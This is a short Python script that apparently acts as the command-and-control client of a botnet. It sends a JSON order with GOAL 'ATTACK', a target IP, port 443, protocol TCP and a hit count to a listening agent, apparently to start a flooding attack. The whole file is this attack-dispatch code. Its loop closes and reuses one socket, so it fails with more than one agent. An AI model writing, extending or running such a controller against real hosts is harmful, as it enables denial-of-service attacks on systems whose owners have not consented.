# echo-client.py
import socket
import json

# #database prerequisites
# import sqlite3
# import os



HOSTS = ["192.168.1.88"]  # The agent's hostname or IP address
PORT = 8574  # The port used by the agent
#Generate payload data
data = {"GOAL": "ATTACK", "COMMAND_CENTER_IP": "192.168.0.88", "TARGET": "192.168.176.105", "PORT": 443, "PROTOCOL": "TCP", "HITS": 100}
data = json.dumps(data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    for HOST in HOSTS:
        s.connect((HOST, PORT))
        s.send(data.encode())
        data = s.recv(1024)
        s.close()

print(f"Received {data!r}")

